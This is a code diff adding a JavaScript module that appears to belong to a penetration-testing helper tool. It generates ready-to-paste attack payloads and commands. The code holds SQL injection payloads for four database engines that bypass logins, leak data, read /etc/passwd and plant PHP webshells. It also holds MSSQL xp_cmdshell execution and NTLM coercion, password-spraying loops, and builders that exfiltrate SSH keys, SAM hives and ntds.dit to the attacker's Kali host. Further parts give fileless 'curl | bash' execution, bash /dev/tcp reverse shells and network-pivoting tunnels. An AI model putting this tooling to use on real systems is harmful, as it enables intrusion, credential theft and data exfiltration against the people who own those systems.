+      { label: 'Classic True Bypass (Login Username or Password Field)', note: 'Evaluates to TRUE and returns the first row in the users table.', payload: "' OR 1=1" + c },
+      { label: 'Target First Account / Admin Directly', note: 'Logs in specifically as the admin account without knowing the password.', payload: "admin'" + c },
+      { label: 'Quote + Parenthesis Break Bypass', note: 'Breaks out of WHERE (\'user\'=\'$u\') grouped clauses.', payload: "') OR ('1'='1" + c },
+      { label: 'Double-Quote Auth Bypass', note: 'Use when the SQL query wraps string literals in double quotes.', payload: '" OR "1"="1' + c },
+    ];
+    var blind = [];
+    var rce = [];
+    if (dbms === 'mysql') {
+      blind = [
+        { label: 'Error-Based Extraction (EXTRACTVALUE)', note: 'Leaks the database version inside the XPath syntax error message.', payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))" + c },
+        { label: 'Error-Based Extraction (UPDATEXML)', note: 'Leaks the current DB user inside an XML error message.', payload: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)" + c },
+        { label: 'Boolean Blind Character Check', note: 'Tests whether the first character of the database name is "a".', payload: "' AND SUBSTRING((SELECT database()),1,1)='a'" + c },
+        { label: 'Conditional Time-Delay Check (5s if root)', note: 'Sleeps 5 seconds only when the DB user starts with root.', payload: "' AND IF(LEFT(user(),4)='root',SLEEP(5),0)" + c },
+      ];
+      rce = [
+        { label: 'Read Local File via LOAD_FILE (requires FILE privilege)', note: 'Reads /etc/passwd into a visible UNION column.', payload: "' UNION SELECT 1,LOAD_FILE('/etc/passwd')" + c },
+        { label: 'Write PHP Webshell via INTO OUTFILE (requires secure_file_priv="")', note: 'Drops a minimal ?c= webshell into the Apache/Nginx web root.', payload: "' UNION SELECT 1,'<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/cmd.php'" + c },
+      ];
+    } else if (dbms === 'mssql') {
+      blind = [
+        { label: 'Error-Based Conversion Leak (CAST to INT)', note: 'Forces SQL Server to leak @@version inside a type conversion error.', payload: "' AND 1=CAST((SELECT @@version) AS INT)" + c },
+        { label: 'Error-Based Database Name Leak', note: 'Leaks the current database name via CONVERT error.', payload: "' AND 1=CONVERT(INT,DB_NAME())" + c },
+        { label: 'Conditional Time-Delay if sysadmin', note: 'Pauses 5 seconds if the current login holds the sysadmin role.', payload: "'; IF (IS_SRVROLEMEMBER('sysadmin')=1) WAITFOR DELAY '0:0:5'" + c },
+      ];
+      rce = [
+        { label: 'Enable xp_cmdshell via Stacked Query', note: 'Re-enables xp_cmdshell when connected as sysadmin.', payload: "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE" + c },
+        { label: 'Execute OS Command via xp_cmdshell', note: 'Runs a PowerShell encoded command as the SQL Server service account.', payload: "'; EXEC xp_cmdshell 'powershell -nop -w hidden -enc <BASE64>'" + c },
+        { label: 'Coerce NetNTLMv2 Authentication to Kali SMB Server', note: 'Catch with Responder or impacket-smbserver on Kali (' + lhost + ').', payload: "'; EXEC master..xp_dirtree '\\\\" + lhost + "\\share'" + c },
+      ];
+    } else if (dbms === 'postgres') {
+      blind = [
+        { label: 'Error-Based Cast Leak', note: 'Leaks PostgreSQL version inside an integer conversion error.', payload: "' AND 1=CAST((SELECT version()) AS INT)" + c },
+        { label: 'Conditional Time-Delay if superuser', note: 'Sleeps 5 seconds if current_setting("is_superuser") is on.', payload: "'; SELECT CASE WHEN (SELECT current_setting('is_superuser'))='on' THEN pg_sleep(5) ELSE pg_sleep(0) END" + c },
+      ];
+      rce = [
+        { label: 'Read Local File via pg_read_file (superuser)', note: 'Reads /etc/passwd directly from disk.', payload: "' UNION SELECT 1,pg_read_file('/etc/passwd',0,10000)" + c },
+        { label: 'Execute OS Command via COPY FROM PROGRAM (PostgreSQL 9.3+)', note: 'Runs OS commands when the DB role holds superuser or pg_execute_server_program.', payload: "'; DROP TABLE IF EXISTS cmd_out; CREATE TABLE cmd_out(t text); COPY cmd_out FROM PROGRAM 'id'; SELECT * FROM cmd_out" + c },
+      ];
+    } else {
+      blind = [
+        { label: 'Boolean Blind Table Name Check (SQLite)', note: 'Checks the first character of the first table name in sqlite_master.', payload: "' AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1),1,1)='u'" + c },
+      ];
+      rce = [
+        { label: 'Dump Full CREATE TABLE Schema from sqlite_master', note: 'Extracts column names and types without information_schema.', payload: "' UNION SELECT 1,sql FROM sqlite_master WHERE type='table'" + c },
+        { label: 'Attach Database Webshell in Web Root (if stacked queries work)', note: 'Creates a new SQLite DB file inside the web root containing PHP code.', payload: "'; ATTACH DATABASE '/var/www/html/cmd.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn VALUES ('<?php system($_GET[\"c\"]); ?>')" + c },
+      ];
+    }
+    if (mode === 'auth_bypass' || mode === 'bypass') return bypass;
+    if (mode === 'error_blind' || mode === 'blind') return blind;
+    if (mode === 'file_rce' || mode === 'rce') return rce;
+    return { bypass: bypass, blind: blind, rce: rce };
+  };
+
+  // ── Spray Planner Command Generator ─────────────────────────────────────────────────────────
+  W.sprayCommands = function (opts) {
+    opts = opts || {};
+    var target = opts.target || '{{target}}';
+    var domain = opts.domain || '{{domain}}';
+    var pass = opts.password || 'Autumn2026!';
+    var userFile = opts.userFile || 'users.txt';
+    var safePass = String(pass).replace(/'/g, "'\\''");
+    var safeCount = opts.safePerWindow || 3;
+    var waitSec = Math.round((opts.windowMin || 30) * 60);
+    return [
+      { label: 'NetExec SMB Single-Password Spray (Recommended)', locus: 'kali$', cmd: "nxc smb " + target + " -u " + userFile + " -p '" + safePass + "' -d " + domain + " --continue-on-success" },
+      { label: 'Kerbrute Kerberos Pre-Auth Spray (Fast & Quiet on Event 4625)', locus: 'kali$', cmd: "kerbrute passwordspray -d " + domain + " --dc " + target + " " + userFile + " '" + safePass + "'" },
+      { label: 'NetExec WinRM Spray (Check Remote Management Access)', locus: 'kali$', cmd: "nxc winrm " + target + " -u " + userFile + " -p '" + safePass + "' -d " + domain },
+      { label: 'Lockout-Safe Multi-Round Loop (' + safeCount + ' Passwords / ' + (opts.windowMin || 30) + 'm Cool-Down)', locus: 'kali$', cmd: "i=0; while IFS= read -r p; do nxc smb " + target + " -u " + userFile + " -p \"$p\" -d " + domain + " --continue-on-success; i=$((i+1)); if [ $((i % " + safeCount + ")) -eq 0 ]; then echo \"[*] Sleeping " + (opts.windowMin || 30) + "m for lockout reset...\"; sleep " + waitSec + "; fi; done < passwords.txt" },
+    ];
+  };
+
+  // ── Scenario-First File Transfer & Exfil Builder ────────────────────────────────────────────
+  var _FT_LINUX = [
+    { name: 'linpeas.sh', file: 'linpeas.sh', label: 'linpeas.sh', dest: '/dev/shm/linpeas.sh', exec: true },
+    { name: 'pspy64', file: 'pspy64', label: 'pspy64 (Cron Monitor)', dest: '/dev/shm/pspy64', exec: true },
+    { name: 'chisel', file: 'chisel', label: 'chisel (Linux)', dest: '/dev/shm/chisel', exec: true },
+    { name: 'agent', file: 'agent', label: 'ligolo-agent', dest: '/dev/shm/agent', exec: true },
+    { name: 'exploit.sh', file: 'exploit.sh', label: 'exploit.sh', dest: '/dev/shm/exploit.sh', exec: true },
+  ];
+  var _FT_WIN = [
+    { name: 'winPEASx64.exe', file: 'winPEASx64.exe', label: 'winPEASx64.exe', dest: 'C:\\Windows\\Temp\\winPEASx64.exe', exec: false },
+    { name: 'nc64.exe', file: 'nc64.exe', label: 'nc64.exe', dest: 'C:\\Windows\\Temp\\nc64.exe', exec: false },
+    { name: 'GodPotato.exe', file: 'GodPotato.exe', label: 'GodPotato.exe', dest: 'C:\\Windows\\Temp\\GodPotato.exe', exec: false },
+    { name: 'RunasCs.exe', file: 'RunasCs.exe', label: 'RunasCs.exe', dest: 'C:\\Windows\\Temp\\RunasCs.exe', exec: false },
+    { name: 'SharpHound.exe', file: 'SharpHound.exe', label: 'SharpHound.exe', dest: 'C:\\Windows\\Temp\\SharpHound.exe', exec: false },
+    { name: 'chisel.exe', file: 'chisel.exe', label: 'chisel.exe', dest: 'C:\\Windows\\Temp\\chisel.exe', exec: false },
+  ];
+  var _FT_EXFIL = [
+    { name: 'id_rsa', file: 'id_rsa', label: 'id_rsa (SSH Key)', dest: './id_rsa', exec: false },
+    { name: 'loot.zip', file: 'loot.zip', label: 'loot.zip (SharpHound / Backup)', dest: './loot.zip', exec: false },
+    { name: 'sam.save', file: 'sam.save', label: 'sam.save (Registry Hive)', dest: './sam.save', exec: false },
+    { name: 'ntds.dit', file: 'ntds.dit', label: 'ntds.dit (AD Database)', dest: './ntds.dit', exec: false },
+  ];
+  W.FILE_TRANSFER_PRESETS = {
+    'kali-to-linux': _FT_LINUX,
+    'linux-in': _FT_LINUX,
+    'kali-to-win': _FT_WIN,
+    'win-in': _FT_WIN,
+    'exfil-to-kali': _FT_EXFIL,
+    'exfil': _FT_EXFIL
+  };
+
+  W.buildFileTransfer = function (opts) {
+    opts = opts || {};
+    var rawDir = opts.direction || 'kali-to-linux';
+    var dir = (rawDir === 'kali-to-win' || rawDir === 'win-in') ? 'kali-to-win'
+      : ((rawDir === 'exfil-to-kali' || rawDir === 'exfil') ? 'exfil-to-kali' : 'kali-to-linux');
+    var lhost = opts.lhost || '{{lhost}}';
+    var port = opts.httpPort || opts.port || '8000';
+    var file = (opts.filename || opts.file || (dir === 'kali-to-win' ? 'winPEASx64.exe' : (dir === 'exfil-to-kali' ? 'loot.zip' : 'linpeas.sh'))).trim();
+    var baseName = file.split(/[\\/]/).pop() || file;
+    var dest = opts.dest || (dir === 'kali-to-win' ? ('C:\\Windows\\Temp\\' + baseName) : (dir === 'exfil-to-kali' ? ('./' + baseName) : ('/dev/shm/' + baseName)));
+    var methods = [];
+
+    if (dir === 'kali-to-linux') {
+      var chmod = /\.(?:txt|conf|json|xml|sql)$/i.test(baseName) ? '' : (' && chmod +x ' + dest);
+      methods.push({
+        id: 'http-linux', recommended: true, badge: 'Recommended', label: '1. Python HTTP Server + curl / wget', title: '1. Python HTTP Server + curl / wget',
+        note: 'Run Step 1 in the Kali folder containing ' + baseName + ', then paste Step 2 into the target shell.',
+        kaliCmd: 'python3 -m http.server ' + port,
+        targetCmd: 'curl -fsSL http://' + lhost + ':' + port + '/' + baseName + ' -o ' + dest + chmod,
+        targetLocus: 'target$',
+        step1: { locus: 'kali$', label: 'Step 1: Serve the directory on Kali', cmd: 'python3 -m http.server ' + port },
+        step2: { locus: 'target$', label: 'Step 2: Download into /dev/shm on Target', cmd: 'curl -fsSL http://' + lhost + ':' + port + '/' + baseName + ' -o ' + dest + chmod },
+        alts: [
+          { locus: 'target$', label: 'Alternative: wget (if curl is missing)', cmd: 'wget -q http://' + lhost + ':' + port + '/' + baseName + ' -O ' + dest + chmod },
+          { locus: 'target$', label: 'Alternative: Fileless in-memory execution (for .sh scripts)', cmd: 'curl -fsSL http://' + lhost + ':' + port + '/' + baseName + ' | bash' },
+        ]
+      });
+      methods.push({
+        id: 'b64-linux', recommended: false, badge: 'Zero Network', label: '2. Base64 Copy-Paste (Works Without Egress)', title: '2. Base64 Copy-Paste (Works Without Egress)',
+        note: 'Use when outbound HTTP/SMB is blocked by a firewall. Encodes the file into terminal text you can paste directly.',
+        kaliCmd: 'base64 -w 0 ' + baseName + '; echo',
+        targetCmd: "echo '<PASTE_BASE64_HERE>' | base64 -d > " + dest + chmod,
+        targetLocus: 'target$',
+        step1: { locus: 'kali$', label: 'Step 1: Base64-encode the file on Kali', cmd: 'base64 -w 0 ' + baseName + '; echo' },
+        step2: { locus: 'target$', label: 'Step 2: Decode on Target', cmd: "echo '<PASTE_BASE64_HERE>' | base64 -d > " + dest + chmod },
+        alts: []
+      });
+      methods.push({
+        id: 'scp-linux', recommended: false, badge: 'SSH Available', label: '3. Direct SCP Push Over SSH', title: '3. Direct SCP Push Over SSH',
+        note: 'If you already have SSH credentials or a private key on the target.',
+        kaliCmd: 'scp ' + baseName + ' ' + (opts.user || 'root') + '@' + (opts.targetIp || opts.target || '{{target}}') + ':' + dest,
+        targetCmd: 'chmod +x ' + dest,
+        targetLocus: 'target$',
+        step1: { locus: 'kali$', label: 'Step 1: Push directly from Kali via scp', cmd: 'scp ' + baseName + ' ' + (opts.user || 'root') + '@' + (opts.targetIp || opts.target || '{{target}}') + ':' + dest },
+        step2: { locus: 'target$', label: 'Step 2: Make executable on Target', cmd: 'chmod +x ' + dest },
+        alts: []
+      });
+    } else if (dir === 'kali-to-win') {
+      methods.push({
+        id: 'http-win', recommended: true, badge: 'Recommended', label: '1. Python HTTP Server + PowerShell IWR', title: '1. Python HTTP Server + PowerShell / certutil',
+        note: 'Run Step 1 in the Kali folder containing ' + baseName + ', then run Step 2 in PowerShell on Windows.',
+        kaliCmd: 'python3 -m http.server ' + port,
+        targetCmd: 'iwr -Uri http://' + lhost + ':' + port + '/' + baseName + ' -OutFile ' + dest + ' -UseBasicParsing',
+        targetLocus: 'PS C:\\>',
+        step1: { locus: 'kali$', label: 'Step 1: Serve the directory on Kali', cmd: 'python3 -m http.server ' + port },
+        step2: { locus: 'PS C:\\>', label: 'Step 2: Download to C:\\Windows\\Temp on Target', cmd: 'iwr -Uri http://' + lhost + ':' + port + '/' + baseName + ' -OutFile ' + dest + ' -UseBasicParsing' },
+        alts: []
+      });
+      methods.push({
+        id: 'certutil-win', recommended: false, badge: 'Plain cmd.exe', label: '2. Python HTTP Server + certutil / curl.exe', title: '2. Python HTTP Server + certutil / curl.exe',
+        note: 'Works directly from a basic cmd.exe shell without spawning PowerShell.',
+        kaliCmd: 'python3 -m http.server ' + port,
+        targetCmd: 'certutil.exe -urlcache -split -f http://' + lhost + ':' + port + '/' + baseName + ' ' + dest,
+        targetLocus: 'C:\\>',
+        step1: { locus: 'kali$', label: 'Step 1: Serve the directory on Kali', cmd: 'python3 -m http.server ' + port },
+        step2: { locus: 'C:\\>', label: 'Step 2: Download via certutil.exe', cmd: 'certutil.exe -urlcache -split -f http://' + lhost + ':' + port + '/' + baseName + ' ' + dest },
+        alts: []
+      });
+      methods.push({
+        id: 'smb-win', recommended: false, badge: 'No Disk Write Option', label: '3. Impacket SMB Share (Copy or Run From \\\\UNC)', title: '3. Impacket SMB Share (Copy or Execute Directly Over UNC)',
+        note: 'Ideal for Windows: you can either copy the binary or run it directly from \\\\' + lhost + '\\share\\' + baseName + ' without writing it to C:\\.',
+        kaliCmd: "impacket-smbserver share . -smb2support -username bob -password 'Autumn2026!'",
+        targetCmd: "net use Z: \\\\" + lhost + "\\share /user:bob 'Autumn2026!' && copy Z:\\" + baseName + " " + dest,
+        targetLocus: 'C:\\>',
+        step1: { locus: 'kali$', label: 'Step 1: Start SMB share on Kali', cmd: "impacket-smbserver share . -smb2support -username bob -password 'Autumn2026!'" },
+        step2: { locus: 'C:\\>', label: 'Step 2: Copy or execute from UNC share', cmd: "net use Z: \\\\" + lhost + "\\share /user:bob 'Autumn2026!' && copy Z:\\" + baseName + " " + dest },
+        alts: []
+      });
+      methods.push({
+        id: 'b64-win', recommended: false, badge: 'Zero Network', label: '4. PowerShell Base64 Copy-Paste (Firewalled)', title: '4. PowerShell Base64 Copy-Paste',
+        note: 'Works even when outbound HTTP and SMB are completely firewalled.',
+        kaliCmd: 'base64 -w 0 ' + baseName + '; echo',
+        targetCmd: '[IO.File]::WriteAllBytes("' + dest + '", [Convert]::FromBase64String("<PASTE_BASE64_HERE>"))',
+        targetLocus: 'PS C:\\>',
+        step1: { locus: 'kali$', label: 'Step 1: Base64-encode on Kali', cmd: 'base64 -w 0 ' + baseName + '; echo' },
+        step2: { locus: 'PS C:\\>', label: 'Step 2: Decode bytes to disk on Target', cmd: '[IO.File]::WriteAllBytes("' + dest + '", [Convert]::FromBase64String("<PASTE_BASE64_HERE>"))' },
+        alts: []
+      });
+    } else {
+      methods.push({
+        id: 'smb-exfil', recommended: true, badge: 'Recommended for Windows', label: '1. Exfiltrate Over Impacket SMB Share', title: '1. Exfiltrate Over Impacket SMB Share',
+        note: 'Fastest way to pull BloodHound zips, registry hives (sam.save/system.save), or documents off a Windows box.',
+        kaliCmd: "impacket-smbserver share . -smb2support -username bob -password 'Autumn2026!'",
+        targetCmd: "net use Z: \\\\" + lhost + "\\share /user:bob 'Autumn2026!' && copy " + file + " Z:\\" + baseName,
+        targetLocus: 'C:\\>',
+        step1: { locus: 'kali$', label: 'Step 1: Start writable SMB share on Kali', cmd: "impacket-smbserver share . -smb2support -username bob -password 'Autumn2026!'" },
+        step2: { locus: 'C:\\>', label: 'Step 2: Copy file from Target to Kali', cmd: "net use Z: \\\\" + lhost + "\\share /user:bob 'Autumn2026!' && copy " + file + " Z:\\" + baseName },
+        alts: []
+      });
+      methods.push({
+        id: 'http-exfil', recommended: false, badge: 'Recommended for Linux', label: '2. HTTP Upload Server / POST Exfil', title: '2. HTTP Upload Server / POST Exfil',
+        note: 'Exfiltrate files over HTTP port ' + port + ' from Linux or Windows.',
+        kaliCmd: 'python3 -m uploadserver ' + port,
+        targetCmd: 'curl -X POST http://' + lhost + ':' + port + '/upload -F "files=@' + file + '"',
+        targetLocus: 'target$',
+        step1: { locus: 'kali$', label: 'Step 1: Start Python uploadserver on Kali', cmd: 'python3 -m uploadserver ' + port },
+        step2: { locus: 'target$', label: 'Step 2: Upload file via curl', cmd: 'curl -X POST http://' + lhost + ':' + port + '/upload -F "files=@' + file + '"' },
+        alts: []
+      });
+      methods.push({
+        id: 'b64-exfil', recommended: false, badge: 'Zero Network', label: '3. Base64 Terminal Copy-Out', title: '3. Base64 Terminal Copy-Out',
+        note: 'Print the file as single-line Base64 in your shell, copy the text, and decode it on Kali.',
+        kaliCmd: "echo '<PASTE_BASE64_HERE>' | base64 -d > " + baseName,
+        targetCmd: 'base64 -w 0 ' + file + '; echo',
+        targetLocus: 'target$',
+        step1: { locus: 'target$', label: 'Step 1 (Linux): Print Base64 in target shell', cmd: 'base64 -w 0 ' + file + '; echo' },
+        step2: { locus: 'kali$', label: 'Step 2: Decode on Kali', cmd: "echo '<PASTE_BASE64_HERE>' | base64 -d > " + baseName },
+        alts: []
+      });
+    }
+    return { direction: dir, file: file, baseName: baseName, dest: dest, destPath: dest, lhost: lhost, port: port, methods: methods };
+  };
+
+  // ── Scenario-First Pivoting, Port-Forward & Tunnel Builder ──────────────────────────────────
+  W.PIVOT_SCENARIOS = [
+    {
+      id: 'local-forward',
+      shortTitle: '1. Reach a 127.0.0.1 Localhost Port',
+      title: '1. Reach a 127.0.0.1 Localhost Port on This Box',
+      badge: 'Local Port Forward',
+      desc: 'ss -tlnp or netstat -ano showed a service (8080, 3306, 5432, 5985) bound to 127.0.0.1 that Kali cannot reach directly.',
+      summary: 'ss -tlnp or netstat -ano showed a service (like 8080, 3306, 5432, 5985) bound to 127.0.0.1 that Kali cannot reach directly.',
+      fieldLabel: 'Hidden Localhost Port on Target',
+      inputLabel: 'Hidden Localhost Port on Target',
+      defaultInput: '8080',
+      presets: ['8080', '3306', '5432', '5985', '6379', '8443', '9000']
+    },
+    {
+      id: 'subnet-route',
+      shortTitle: '2. Route Into a Hidden Internal Subnet',
+      title: '2. Route Into a Hidden Internal Subnet',
+      badge: 'Full Subnet Pivot',
+      desc: 'ip a or ipconfig revealed a second network interface (172.16.5.0/24 or 10.10.20.0/24) behind the compromised pivot host.',
+      summary: 'ip a or ipconfig revealed a second network interface (like 172.16.5.0/24 or 10.10.20.0/24) behind the compromised pivot host.',
+      fieldLabel: 'Internal Subnet CIDR',
+      inputLabel: 'Internal Subnet CIDR',
+      defaultInput: '172.16.5.0/24',
+      presets: ['172.16.5.0/24', '10.10.20.0/24', '192.168.100.0/24']
+    },
+    {
+      id: 'reverse-relay',
+      shortTitle: '3. Catch a Reverse Shell Through Pivot Host',
+      title: '3. Catch a Reverse Shell Through the Pivot Host',
+      badge: 'Reverse Port Relay',
+      desc: 'An internal box cannot reach your Kali VPN IP directly, so its reverse shell or HTTP request must bounce through the Pivot Host.',
+      summary: 'An internal box cannot reach your Kali VPN IP directly, so its reverse shell or HTTP download must bounce through the Pivot Host.',
+      fieldLabel: 'Pivot Host Internal IP',
+      inputLabel: 'Pivot Host Internal IP',
+      defaultInput: '172.16.5.10',
+      presets: ['172.16.5.10', '10.10.20.10', '192.168.100.10']
+    }
+  ];
+
+  W.buildPivotPlan = function (opts) {
+    opts = opts || {};
+    var rawScen = opts.scenario || 'local-forward';
+    var scenario = (rawScen === 'local-port') ? 'local-forward' : ((rawScen === 'subnet') ? 'subnet-route' : rawScen);
+    var tool = opts.tool || (scenario === 'subnet-route' ? 'ligolo' : 'chisel');
+    var lhost = opts.lhost || '{{lhost}}';
+    var target = opts.pivotIp || opts.target || '{{target}}';
+    var user = opts.user || 'root';
+    var chiselPort = opts.chiselPort || '8000';
+    var socksPort = opts.socksPort || '1080';
+    var steps = [];
+    var note = '';
+
+    if (scenario === 'local-forward') {
+      var rport = (opts.rport || opts.value || '8080').trim();
+      var lport = (opts.lport || rport).trim();
+      if (tool === 'ssh') {
+        note = 'Zero binaries needed on target: forwards Kali 127.0.0.1:' + lport + ' directly to Target 127.0.0.1:' + rport + ' over SSH.';
+        steps = [
+          { locus: 'kali$', title: 'Step 1: Open SSH Local Port Forward from Kali', label: 'Step 1: Open SSH local port forward from Kali', note: 'Binds 127.0.0.1:' + lport + ' on Kali and tunnels to 127.0.0.1:' + rport + ' on ' + target + '.', cmd: 'ssh -N -L 127.0.0.1:' + lport + ':127.0.0.1:' + rport + ' ' + user + '@' + target },
+          { locus: 'kali$', title: 'Step 2: Access the Service Locally on Kali', label: 'Step 2: Access the internal service locally on Kali', note: 'Point your browser, curl, or database client at 127.0.0.1:' + lport + '.', cmd: 'curl -i http://127.0.0.1:' + lport + '/' },
+        ];
+      } else if (tool === 'ligolo') {
+        note = 'Ligolo-ng special CIDR 240.0.0.1/32 routes directly to the Pivot Host own 127.0.0.1 loopback without proxychains.';
+        steps = [
+          { locus: 'kali$', title: 'Step 1: Create ligolo TUN Interface & Start Proxy on Kali', label: 'Step 1: Create ligolo TUN interface & start proxy on Kali', note: 'Run once on Kali to listen on TCP 11601.', cmd: 'sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up && ./proxy -selfcert -laddr 0.0.0.0:11601' },
+          { locus: 'target$', title: 'Step 2: Connect ligolo Agent from Target Back to Kali', label: 'Step 2: Connect ligolo agent from Target back to Kali', note: 'Establishes the encrypted tunnel.', cmd: './agent -connect ' + lhost + ':11601 -ignore-cert' },
+          { locus: 'kali$', title: 'Step 3: Route 240.0.0.1/32 to Target Loopback & Hit Port ' + rport, label: 'Step 3: Add the 240.0.0.1 loopback route & hit port ' + rport, note: 'In ligolo console select session and run start, then access 240.0.0.1:' + rport + '.', cmd: 'sudo ip route add 240.0.0.1/32 dev ligolo && curl -i http://240.0.0.1:' + rport + '/' },
+        ];
+      } else {
+        note = 'Works from any reverse/web shell (no SSH required). Tunnels Target 127.0.0.1:' + rport + ' back to Kali 127.0.0.1:' + lport + '.';
+        steps = [
+          { locus: 'kali$', title: 'Step 1: Start Chisel Reverse Server on Kali', label: 'Step 1: Start Chisel reverse server on Kali', note: 'Listens on port ' + chiselPort + ' for the target Chisel client.', cmd: 'chisel server -p ' + chiselPort + ' --reverse' },
+          { locus: 'target$', title: 'Step 2: Connect Chisel Client from Target', label: 'Step 2: Connect Chisel client from Target to forward port ' + rport, note: 'Forwards Kali 127.0.0.1:' + lport + ' into Target 127.0.0.1:' + rport + '.', cmd: './chisel client ' + lhost + ':' + chiselPort + ' R:' + lport + ':127.0.0.1:' + rport },
+          { locus: 'kali$', title: 'Step 3: Access the Hidden Service on Kali Localhost', label: 'Step 3: Access the service on Kali localhost:' + lport, note: 'Connect to 127.0.0.1:' + lport + ' from Kali.', cmd: 'curl -i http://127.0.0.1:' + lport + '/' },
+        ];
+      }
+    } else if (scenario === 'subnet-route') {
+      var subnet = (opts.subnet || opts.value || '172.16.5.0/24').trim();
+      if (tool === 'ligolo') {
+        note = 'Recommended for internal subnets: creates a real Linux TUN interface so Nmap, NetExec, and Impacket work natively without proxychains.';
+        steps = [
+          { locus: 'kali$', title: 'Step 1: Create ligolo TUN Interface & Route ' + subnet, label: 'Step 1: Create ligolo TUN interface & route ' + subnet, note: 'Sets up the ligolo interface and routes ' + subnet + ' through it.', cmd: 'sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up && sudo ip route add ' + subnet + ' dev ligolo && ./proxy -selfcert -laddr 0.0.0.0:11601' },
+          { locus: 'target$', title: 'Step 2: Connect ligolo Agent on Pivot Host', label: 'Step 2: Run ligolo agent on Pivot Host', note: 'In the ligolo proxy console, select the session and type: start', cmd: './agent -connect ' + lhost + ':11601 -ignore-cert' },
+          { locus: 'kali$', title: 'Step 3: Scan / Attack Internal Subnet Directly (No Proxychains)', label: 'Step 3: Scan or attack internal subnet directly from Kali', note: 'All TCP tools talk directly to ' + subnet + ' through the TUN interface.', cmd: 'nxc smb ' + subnet },
+        ];
+      } else if (tool === 'ssh') {
+        note = 'Instant SOCKS5 proxy over SSH (-D ' + socksPort + '). Pair with proxychains4 -q for all TCP tools.';
+        steps = [
+          { locus: 'kali$', title: 'Step 1: Start Dynamic SOCKS5 Proxy Over SSH', label: 'Step 1: Start dynamic SOCKS5 proxy over SSH', note: 'Opens SOCKS5 proxy on Kali 127.0.0.1:' + socksPort + '.', cmd: 'ssh -N -D 127.0.0.1:' + socksPort + ' ' + user + '@' + target },
+          { locus: 'kali$', title: 'Step 2: Verify /etc/proxychains4.conf Points to socks5 127.0.0.1 ' + socksPort, label: 'Step 2: Ensure /etc/proxychains4.conf ends with socks5 127.0.0.1 ' + socksPort, note: 'Make sure socks5 127.0.0.1 ' + socksPort + ' is set at the bottom of /etc/proxychains4.conf.', cmd: 'tail -n 3 /etc/proxychains4.conf' },
+          { locus: 'kali$', title: 'Step 3: Run Tools Through proxychains4', label: 'Step 3: Run tools through proxychains (-sT -Pn required for Nmap)', note: 'Prefix any TCP command with proxychains4 -q.', cmd: 'proxychains4 -q nxc smb ' + subnet },
+        ];
+      } else {
+        note = 'Chisel Reverse SOCKS5 proxy on 127.0.0.1:' + socksPort + '. Works from any shell without SSH.';
+        steps = [
+          { locus: 'kali$', title: 'Step 1: Start Chisel Reverse Server on Kali', label: 'Step 1: Start Chisel reverse server on Kali', note: 'Listens on port ' + chiselPort + ' and opens SOCKS5 on 127.0.0.1:1080.', cmd: 'chisel server -p ' + chiselPort + ' --reverse' },
+          { locus: 'target$', title: 'Step 2: Connect Chisel SOCKS Client from Pivot Host', label: 'Step 2: Connect Chisel SOCKS client from Pivot Host', note: 'Creates the reverse SOCKS5 tunnel back to Kali.', cmd: './chisel client ' + lhost + ':' + chiselPort + ' R:socks' },
+          { locus: 'kali$', title: 'Step 3: Scan Internal Subnet via proxychains4', label: 'Step 3: Run tools via proxychains4 (socks5 127.0.0.1 ' + socksPort + ')', note: 'Always use -sT -Pn with Nmap over SOCKS.', cmd: 'proxychains4 -q nmap -sT -Pn --top-ports 50 ' + subnet },
+        ];
+      }
+    } else {
+      var pivIp = (opts.internalIp || opts.value || '172.16.5.10').trim();
+      var rPort = (opts.lport || '4444').trim();
+      if (tool === 'ligolo') {
+        note = 'Ligolo-ng listener_add binds port ' + rPort + ' on the Pivot Host and forwards incoming reverse shells straight to your Kali listener.';
+        steps = [
+          { locus: 'kali$', title: 'Step 1: Add Reverse Listener in Active Ligolo Session', label: 'Step 1: In active ligolo session, add a reverse listener on Pivot Host', note: 'Forwards Pivot Host 0.0.0.0:' + rPort + ' to Kali 127.0.0.1:' + rPort + '.', cmd: 'listener_add --addr 0.0.0.0:' + rPort + ' --to 127.0.0.1:' + rPort + ' --tcp' },
+          { locus: 'kali$', title: 'Step 2: Start Netcat Listener on Kali', label: 'Step 2: Start your Netcat listener on Kali', note: 'Catches the forwarded shell on Kali.', cmd: 'nc -lvnp ' + rPort },
+          { locus: 'target$', title: 'Step 3: Execute Reverse Shell on Internal Host Pointing at Pivot IP', label: 'Step 3: Point internal target payload at Pivot Host Internal IP (' + pivIp + ':' + rPort + ')', note: 'Connects to Pivot Host ' + pivIp + ':' + rPort + ', which relays to Kali.', cmd: 'bash -i >& /dev/tcp/' + pivIp + '/' + rPort + ' 0>&1' },
+        ];
+      } else if (tool === 'ssh') {
+        note = 'SSH remote port forward (-R) opens port ' + rPort + ' on the Pivot Host and forwards connections to Kali.';
+        steps = [
+          { locus: 'kali$', title: 'Step 1: Start Netcat Listener on Kali', label: 'Step 1: Start Netcat listener on Kali', note: 'Listens on Kali port ' + rPort + '.', cmd: 'nc -lvnp ' + rPort },
+          { locus: 'kali$', title: 'Step 2: Bind Port ' + rPort + ' on Pivot Host via SSH -R', label: 'Step 2: Bind port ' + rPort + ' on Pivot Host via SSH -R', note: 'Forwards Pivot Host port ' + rPort + ' back to Kali.', cmd: 'ssh -N -o GatewayPorts=yes -R 0.0.0.0:' + rPort + ':127.0.0.1:' + rPort + ' ' + user + '@' + target },
+          { locus: 'target$', title: 'Step 3: Trigger Reverse Shell on Internal Host to ' + pivIp + ':' + rPort, label: 'Step 3: Point internal target payload at ' + pivIp + ':' + rPort, note: 'Internal host connects to the Pivot Host internal IP.', cmd: 'bash -i >& /dev/tcp/' + pivIp + '/' + rPort + ' 0>&1' },
+        ];
+      } else {
+        note = 'Forwards incoming connections on Pivot Host port ' + rPort + ' straight to Kali ' + lhost + ':' + rPort + ' using socat or Windows netsh.';
+        steps = [
+          { locus: 'kali$', title: 'Step 1: Start Netcat Listener on Kali', label: 'Step 1: Start Netcat listener on Kali', note: 'Listens on Kali ' + lhost + ':' + rPort + '.', cmd: 'nc -lvnp ' + rPort },
